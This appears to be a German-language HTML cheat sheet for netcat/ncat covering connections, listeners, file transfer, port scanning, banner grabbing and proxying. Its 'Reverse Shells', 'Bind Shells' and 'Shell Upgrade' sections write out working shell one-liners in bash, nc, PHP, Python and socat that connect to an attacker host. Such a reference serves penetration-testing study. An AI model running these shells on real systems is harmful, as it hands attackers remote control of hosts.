@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>netcat / ncat - TheLayer0Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="../assets/netcat.svg">
+<style>
+  :root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--accent:#0f766e;--accent2:#5eead4;--green:#3fb950;--purple:#a371f7;--cyan:#39c5cf;--red:#f47067;--text:#e6edf3;--muted:#7d8590;--code-bg:#10161d;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Syne',sans-serif;min-height:100vh;}
+  header{background:linear-gradient(135deg,#0d1117 0%,#010e0d 50%,#0d1117 100%);border-bottom:2px solid var(--accent);padding:40px 48px 32px;position:relative;overflow:hidden;}
+  header::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 600px 200px at 60% 50%,rgba(15,118,110,.08),transparent);}
+  .header-grid{display:grid;grid-template-columns:1fr auto;align-items:end;gap:24px;position:relative;}
+  .badge{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:600;color:var(--accent);background:rgba(15,118,110,.1);border:1px solid rgba(15,118,110,.3);padding:3px 10px;border-radius:3px;letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;}
+  h1{font-size:clamp(28px,4vw,48px);font-weight:800;letter-spacing:-1px;line-height:1.1;color:var(--text);}
+  h1 span{color:var(--accent);}
+  .subtitle{color:var(--muted);font-size:14px;margin-top:8px;font-family:'JetBrains Mono',monospace;}
+  .meta{text-align:right;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.8;}
+  .meta strong{color:var(--accent2);}
+  .version-legend{margin-top:18px;display:flex;gap:10px;flex-wrap:wrap;}
+  .chip{font-family:'JetBrains Mono',monospace;font-size:11px;border-radius:4px;padding:4px 12px;font-weight:600;}
+  .ch-ac{background:rgba(15,118,110,.1);border:1px solid rgba(15,118,110,.3);color:var(--accent);}
+  .ch-gn{background:rgba(63,185,80,.1);border:1px solid rgba(63,185,80,.3);color:var(--green);}
+  .ch-cy{background:rgba(57,197,207,.1);border:1px solid rgba(57,197,207,.3);color:var(--cyan);}
+  .ch-pu{background:rgba(163,113,247,.1);border:1px solid rgba(163,113,247,.3);color:var(--purple);}
+  main{padding:32px 48px;max-width:1400px;margin:0 auto;columns:3;column-gap:20px;}
+  .section{break-inside:avoid;margin-bottom:20px;background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+  .section-header{display:flex;align-items:center;gap:10px;padding:12px 16px;border-bottom:1px solid var(--border);}
+  .section-icon{width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;}
+  .section-title{font-size:13px;font-weight:600;letter-spacing:.5px;text-transform:uppercase;}
+  .th-ac .section-header{background:rgba(15,118,110,.06);} .th-ac .section-icon{background:rgba(15,118,110,.15);} .th-ac .section-title{color:var(--accent);}
+  .th-gn .section-header{background:rgba(63,185,80,.06);} .th-gn .section-icon{background:rgba(63,185,80,.15);} .th-gn .section-title{color:var(--green);}
+  .th-cy .section-header{background:rgba(57,197,207,.06);} .th-cy .section-icon{background:rgba(57,197,207,.15);} .th-cy .section-title{color:var(--cyan);}
+  .th-pu .section-header{background:rgba(163,113,247,.06);} .th-pu .section-icon{background:rgba(163,113,247,.15);} .th-pu .section-title{color:var(--purple);}
+  .th-re .section-header{background:rgba(244,112,103,.06);} .th-re .section-icon{background:rgba(244,112,103,.15);} .th-re .section-title{color:var(--red);}
+  .th-or .section-header{background:rgba(249,115,22,.06);} .th-or .section-icon{background:rgba(249,115,22,.15);} .th-or .section-title{color:#f97316;}
+  .th-bl .section-header{background:rgba(59,130,246,.06);} .th-bl .section-icon{background:rgba(59,130,246,.15);} .th-bl .section-title{color:#3b82f6;}
+  .command-list{padding:8px 0;}
+  .cmd-entry{padding:6px 16px;border-bottom:1px solid rgba(48,54,61,.5);}
+  .cmd-entry:last-child{border-bottom:none;}
+  .cmd-desc{font-size:10px;color:var(--muted);margin-bottom:3px;letter-spacing:.3px;text-transform:uppercase;}
+  code{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--text);background:var(--code-bg);display:block;padding:5px 9px;border-radius:4px;line-height:1.6;white-space:pre-wrap;word-break:break-all;}
+  .kw{color:#14b8a6;font-weight:700;} .st{color:#3fb950;} .nu{color:#f47067;}
+  .cm{color:#7d8590;font-style:italic;} .fn{color:#39c5cf;font-weight:600;}
+  .tip{padding:8px 16px;background:rgba(15,118,110,.06);border-left:3px solid var(--accent);font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);line-height:1.6;}
+  .tip strong{color:var(--text);}
+  .nav-link{position:absolute;top:40px;right:48px;z-index:10;font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--accent);text-decoration:none;border:1px solid rgba(15,118,110,.3);padding:4px 12px;border-radius:4px;background:rgba(15,118,110,.08);}
+  .nav-link:hover{background:rgba(15,118,110,.15);}
+  @media(max-width:1100px){main{columns:2;}}
+  @media(max-width:700px){main{columns:1;padding:16px;}header{padding:24px 16px;}}
+</style>
+</head>
+<body>
+<header>
+  <a href="../index.html" class="nav-link">← Index</a>
+  <div class="header-grid">
+    <div>
+      <div class="badge">▸ Security · Network Utility</div>
+      <img src="../assets/netcat.svg" alt="Logo" style="width:48px;height:48px;margin-bottom:12px;display:block;filter:invert(38%) sepia(72%) saturate(500%) hue-rotate(142deg)">
+      <h1><span>netcat</span> / ncat<br>TheLayer<span style="color:#a371f7;font-family:'JetBrains Mono',monospace;font-size:1.25em;-webkit-text-fill-color:#a371f7;">0</span>Guide</h1>
+      <p class="subtitle">$ nc -lvp 4444</p>
+      <div class="version-legend">
+        <div class="chip ch-ac">nc / ncat</div>
+        <div class="chip ch-gn">Dateitransfer</div>
+        <div class="chip ch-cy">Port-Scanning</div>
+        <div class="chip ch-pu">Reverse Shells</div>
+      </div>
+    </div>
+    <div class="meta"><strong>netcat / ncat</strong><br>TCP · UDP<br>Listen · Connect<br>Dateitransfer<br>Shell-Relaying<br>Banner Grabbing</div>
+  </div>
+</header>
+<main>
+
+<!-- 1. Grundlagen & Verbindung -->
+<div class="section th-ac">
+  <div class="section-header"><div class="section-icon">🔌</div><div class="section-title">Grundlagen &amp; Verbindung</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">TCP-Verbindung aufbauen</div>
+      <code>nc <span class="fn">HOST</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">UDP-Verbindung</div>
+      <code>nc <span class="kw">-u</span> <span class="fn">HOST</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Verbose / extra verbose</div>
+      <code>nc <span class="kw">-v</span>  <span class="fn">HOST</span> <span class="nu">PORT</span>   <span class="cm"># Verbindungsinfo</span>
+nc <span class="kw">-vv</span> <span class="fn">HOST</span> <span class="nu">PORT</span>   <span class="cm"># extra verbose</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Timeout / kein DNS-Lookup</div>
+      <code>nc <span class="kw">-w 5</span> <span class="fn">HOST</span> <span class="nu">PORT</span>   <span class="cm"># Timeout 5 s</span>
+nc <span class="kw">-n</span>   <span class="fn">HOST</span> <span class="nu">PORT</span>   <span class="cm"># kein DNS</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Port-Scan ohne Datenübertragung</div>
+      <code>nc <span class="kw">-z</span> <span class="fn">HOST</span> <span class="nu">1-1024</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">TLS-Verbindung (ncat)</div>
+      <code>ncat <span class="kw">--ssl</span> <span class="fn">HOST</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="tip"><strong>nc</strong> (GNU/BSD) vs. <strong>ncat</strong> (Nmap-Projekt): ncat bietet SSL, Broker-Modus und mehr Optionen. <strong>-n</strong> verhindert DNS-Lookups für schnellere Verbindungen.</div>
+  </div>
+</div>
+
+<!-- 2. Listen-Mode (Server) -->
+<div class="section th-gn">
+  <div class="section-header"><div class="section-icon">👂</div><div class="section-title">Listen-Mode (Server)</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Einmalig auf Port lauschen</div>
+      <code>nc <span class="kw">-l</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Dauerhaft lauschen (keep-open)</div>
+      <code>nc <span class="kw">-lk</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Verbose / UDP-Listener</div>
+      <code>nc <span class="kw">-lv</span>  <span class="nu">PORT</span>   <span class="cm"># verbose</span>
+nc <span class="kw">-lu</span>  <span class="nu">PORT</span>   <span class="cm"># UDP</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Typischer Shell-Listener</div>
+      <code>nc <span class="kw">-lvp</span> <span class="nu">4444</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">ncat — keep-open / verschlüsselt</div>
+      <code>ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--keep-open</span>
+ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--ssl</span></code>
+    </div>
+    <div class="tip"><strong>-lk</strong> (GNU nc) akzeptiert mehrere Verbindungen nacheinander. Bei BSD nc <strong>-l</strong> und Schleife im Shell-Skript verwenden.</div>
+  </div>
+</div>
+
+<!-- 3. Dateitransfer -->
+<div class="section th-or">
+  <div class="section-header"><div class="section-icon">📦</div><div class="section-title">Dateitransfer</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Empfänger vorbereiten</div>
+      <code>nc <span class="kw">-l</span> <span class="nu">9999</span> <span class="kw">&gt;</span> <span class="st">empfangen.bin</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Sender (Datei übertragen)</div>
+      <code>nc <span class="fn">HOST</span> <span class="nu">9999</span> <span class="kw">&lt;</span> <span class="st">datei.bin</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Mit Fortschrittsanzeige (pv)</div>
+      <code>nc <span class="kw">-l</span> <span class="nu">9999</span> | pv <span class="kw">&gt;</span> <span class="st">datei.bin</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Verzeichnis senden / empfangen</div>
+      <code><span class="cm"># Sender:</span>
+tar czf - /verz | nc <span class="fn">HOST</span> <span class="nu">9999</span>
+<span class="cm"># Empfänger:</span>
+nc <span class="kw">-l</span> <span class="nu">9999</span> | tar xzf -</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Einfacher HTTP-Einmal-Webserver</div>
+      <code>while true; do nc <span class="kw">-l</span> <span class="nu">8080</span> <span class="kw">&lt;</span> <span class="st">index.html</span>; done</code>
+    </div>
+    <div class="tip"><strong>Kein Verschlüsselung</strong> — bei sensiblen Daten <strong>ncat --ssl</strong> oder <strong>scp/rsync</strong> über SSH bevorzugen.</div>
+  </div>
+</div>
+
+<!-- 4. Reverse Shells -->
+<div class="section th-re">
+  <div class="section-header"><div class="section-icon">🐚</div><div class="section-title">Reverse Shells</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Listener auf Angreifer-Seite</div>
+      <code>nc <span class="kw">-lvp</span> <span class="nu">4444</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Bash Reverse Shell (Opfer)</div>
+      <code>bash <span class="kw">-i</span> &gt;&amp; /dev/tcp/<span class="fn">ANGREIFER</span>/<span class="nu">4444</span> 0&gt;&amp;1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">nc mit -e (GNU/ncat)</div>
+      <code>nc <span class="fn">ANGREIFER</span> <span class="nu">4444</span> <span class="kw">-e</span> /bin/sh</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Ohne -e (BSD nc / mkfifo)</div>
+      <code>rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | /bin/sh <span class="kw">-i</span> 2&gt;&amp;1 \
+  | nc <span class="fn">ANGREIFER</span> <span class="nu">4444</span> &gt; /tmp/f</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">PHP Reverse Shell</div>
+      <code>php <span class="kw">-r</span> <span class="st">'$s=fsockopen("ANGREIFER",4444);
+exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Python3 Reverse Shell</div>
+      <code>python3 <span class="kw">-c</span> <span class="st">'import socket,subprocess,os
+s=socket.socket()
+s.connect(("ANGREIFER",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])'</span></code>
+    </div>
+    <div class="tip"><strong>-e</strong> fehlt bei OpenBSD nc. Dort mkfifo-Trick verwenden oder ncat installieren (Nmap-Paket).</div>
+  </div>
+</div>
+
+<!-- 5. Bind Shells -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🔗</div><div class="section-title">Bind Shells</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Opfer bindet Shell an Port (mit -e)</div>
+      <code>nc <span class="kw">-lvp</span> <span class="nu">4444</span> <span class="kw">-e</span> /bin/bash</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Angreifer verbindet sich</div>
+      <code>nc <span class="fn">OPFER</span> <span class="nu">4444</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Bind Shell ohne -e (mkfifo)</div>
+      <code>rm /tmp/f; mkfifo /tmp/f
+cat /tmp/f | bash <span class="kw">-i</span> 2&gt;&amp;1 \
+  | nc <span class="kw">-l</span> <span class="nu">4444</span> &gt; /tmp/f</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Windows Bind Shell (cmd.exe)</div>
+      <code>nc <span class="kw">-lvp</span> <span class="nu">4444</span> <span class="kw">-e</span> cmd.exe</code>
+    </div>
+    <div class="tip"><strong>Bind Shell</strong> = Opfer lauscht. <strong>Reverse Shell</strong> = Opfer verbindet sich zurück. Reverse Shells umgehen Firewalls leichter, da ausgehende Verbindungen oft erlaubt sind.</div>
+  </div>
+</div>
+
+<!-- 6. Port-Scanning -->
+<div class="section th-ac">
+  <div class="section-header"><div class="section-icon">🔍</div><div class="section-title">Port-Scanning</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Port-Scan mit Ausgabe</div>
+      <code>nc <span class="kw">-zv</span> <span class="fn">HOST</span> <span class="nu">1-1024</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Spezifische Ports prüfen</div>
+      <code>nc <span class="kw">-zv</span> <span class="fn">HOST</span> <span class="nu">22 80 443 3306</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Nur offene Ports ausgeben</div>
+      <code>nc <span class="kw">-zvn</span> <span class="fn">HOST</span> <span class="nu">1-65535</span> 2&gt;&amp;1 \
+  | grep <span class="st">succeeded</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">UDP-Scan / mit Timeout</div>
+      <code>nc <span class="kw">-zvu</span>  <span class="fn">HOST</span> <span class="nu">1-1024</span>
+nc <span class="kw">-zvw1</span> <span class="fn">HOST</span> <span class="nu">1-1024</span> 2&gt;&amp;1</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Shell-Schleife über Portbereich</div>
+      <code>for p in $(seq <span class="nu">1</span> <span class="nu">1024</span>); do
+  nc <span class="kw">-zw1</span> <span class="fn">HOST</span> $p \
+    &amp;&amp; echo <span class="st">"OPEN: $p"</span>
+done</code>
+    </div>
+    <div class="tip"><strong>Hinweis:</strong> Für umfangreiche Scans ist <strong>nmap</strong> besser geeignet. nc-Scans sind langsam und erzeugen mehr Logs.</div>
+  </div>
+</div>
+
+<!-- 7. Banner Grabbing -->
+<div class="section th-gn">
+  <div class="section-header"><div class="section-icon">🏷️</div><div class="section-title">Banner Grabbing</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">HTTP-Banner / HEAD-Request</div>
+      <code>echo <span class="st">""</span> | nc <span class="kw">-w1</span> <span class="fn">HOST</span> <span class="nu">80</span>
+echo <span class="kw">-e</span> <span class="st">"HEAD / HTTP/1.0\r\n"</span> | nc <span class="fn">HOST</span> <span class="nu">80</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">SMTP-Banner</div>
+      <code>nc <span class="fn">HOST</span> <span class="nu">25</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">FTP-Banner</div>
+      <code>nc <span class="fn">HOST</span> <span class="nu">21</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">SSH-Banner</div>
+      <code>nc <span class="fn">HOST</span> <span class="nu">22</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">POP3-Banner</div>
+      <code>echo <span class="st">"QUIT"</span> | nc <span class="fn">HOST</span> <span class="nu">110</span></code>
+    </div>
+    <div class="tip"><strong>Banner Grabbing</strong> liefert Versionsinformationen ohne aktiven Scan. Kombiniere mit <strong>-w1</strong> (Timeout), damit nc nicht hängt.</div>
+  </div>
+</div>
+
+<!-- 8. Proxying & Relaying -->
+<div class="section th-pu">
+  <div class="section-header"><div class="section-icon">🔄</div><div class="section-title">Proxying &amp; Relaying</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Bidirektionaler Port-Forward (mkfifo)</div>
+      <code>mkfifo /tmp/pipe
+nc <span class="kw">-l</span> <span class="nu">8080</span> &lt; /tmp/pipe \
+  | nc <span class="fn">ZIEL</span> <span class="nu">80</span> &gt; /tmp/pipe</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">ncat SOCKS5-Proxy-Verbindung</div>
+      <code>ncat <span class="kw">--proxy-type</span> socks5 \
+  <span class="kw">--proxy</span> <span class="fn">proxyhost</span>:<span class="nu">1080</span> \
+  <span class="fn">ZIEL</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">ncat Broker (Multi-Client-Relay)</div>
+      <code>ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--broker</span>
+<span class="cm"># alle verbundenen Clients erhalten</span>
+<span class="cm"># gegenseitig ihre Nachrichten</span></code>
+    </div>
+    <div class="tip"><strong>SSH-Tunnel</strong> bevorzugen wenn möglich: <strong>ssh -L 8080:ziel:80 user@sprunghost</strong> — verschlüsselt und zuverlässiger.</div>
+  </div>
+</div>
+
+<!-- 9. ncat-Erweiterungen -->
+<div class="section th-re">
+  <div class="section-header"><div class="section-icon">⚡</div><div class="section-title">ncat-Erweiterungen</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Einfacher Chat-Server</div>
+      <code>ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--chat</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Shell binden (exec)</div>
+      <code>ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--exec</span> /bin/bash
+ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--sh-exec</span> <span class="st">"bash"</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">TLS-Listener mit eigenem Zertifikat</div>
+      <code>ncat <span class="kw">--ssl -l</span> <span class="nu">PORT</span>
+ncat <span class="kw">--ssl-cert</span> <span class="st">cert.pem</span> \
+  <span class="kw">--ssl-key</span> <span class="st">key.pem</span> <span class="kw">-l</span> <span class="nu">PORT</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Verbindungslimit setzen</div>
+      <code>ncat <span class="kw">-l</span> <span class="nu">PORT</span> <span class="kw">--max-conns</span> <span class="nu">1</span></code>
+    </div>
+    <div class="tip"><strong>ncat</strong> ist im <strong>nmap</strong>-Paket enthalten (<code>apt install nmap</code> / <code>dnf install nmap</code>). Es ist der moderne Ersatz für nc mit SSL-Unterstützung.</div>
+  </div>
+</div>
+
+<!-- 10. Shell Upgrade & TTY -->
+<div class="section th-bl">
+  <div class="section-header"><div class="section-icon">🖥️</div><div class="section-title">Shell Upgrade &amp; TTY</div></div>
+  <div class="command-list">
+    <div class="cmd-entry">
+      <div class="cmd-desc">Schritt 1 — PTY spawnen (Python)</div>
+      <code>python3 <span class="kw">-c</span> <span class="st">'import pty; pty.spawn("/bin/bash")'</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Schritt 2 — TTY auf Angreifer-Seite</div>
+      <code><span class="cm"># Ctrl+Z → nc in Hintergrund</span>
+stty raw <span class="kw">-echo</span>; fg
+<span class="cm"># Enter drücken → Shell zurück</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Schritt 3 — Terminal-Umgebung setzen</div>
+      <code>export <span class="fn">TERM</span>=xterm-256color
+stty rows <span class="nu">40</span> cols <span class="nu">150</span></code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">Direkt vollständiges TTY (socat)</div>
+      <code><span class="cm"># Angreifer:</span>
+socat file:`tty`,raw,echo=0 tcp:<span class="fn">HOST</span>:<span class="nu">PORT</span>
+<span class="cm"># Opfer:</span>
+socat tcp-connect:<span class="fn">HOST</span>:<span class="nu">PORT</span> \
+  exec:bash,pty,stderr,sane</code>
+    </div>
+    <div class="cmd-entry">
+      <div class="cmd-desc">History &amp; Editierung (rlwrap)</div>
+      <code>rlwrap nc <span class="kw">-lvp</span> <span class="nu">4444</span></code>
+    </div>
+    <div class="tip"><strong>Vollständiges TTY</strong> erlaubt Tab-Completion, Cursor-Tasten, <strong>sudo</strong> und interaktive Programme wie <strong>vi</strong>. Ohne TTY-Upgrade funktionieren viele Befehle nicht korrekt.</div>
+  </div>
+</div>
+
+</main>
+</body>
+</html>
